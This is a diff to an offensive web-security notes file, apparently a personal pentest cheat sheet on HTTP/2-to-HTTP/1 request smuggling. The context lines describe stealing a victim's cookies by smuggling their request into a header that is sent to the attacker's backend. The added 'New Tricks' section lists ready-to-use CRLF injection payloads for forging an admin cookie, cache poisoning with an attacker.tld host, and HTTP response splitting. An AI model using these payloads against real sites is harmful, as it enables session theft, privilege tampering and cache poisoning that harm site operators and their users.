@@ -81,4 +81,17 @@ Exploits the downgrade process where FE (HTTP/2) rewrites requests to BE (HTTP/1
     - The victim's entire request (including Cookies) will be "swallowed" as the value of `X-Ignore` and sent to your backend.
         
 - **Authentication:** Always include your own `Cookie` and `Host` headers inside the smuggled block to ensure the backend processes the request with your permissions.
-    
+
+## New Tricks
+
+### Trick 1
+- Scenario: Header injection set arbitrary response cookie via redirect parameter.
+- Payload: `%0d%0aSet-Cookie:%20admin=true;Path=/;HttpOnly`
+
+### Trick 2
+- Scenario: Cache poisoning by injecting X-Forwarded-Host in reflected header.
+- Payload: `%0d%0aX-Forwarded-Host:%20attacker.tld`
+
+### Trick 3
+- Scenario: Response splitting created attacker-controlled body in victim cache.
+- Payload: `%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK`
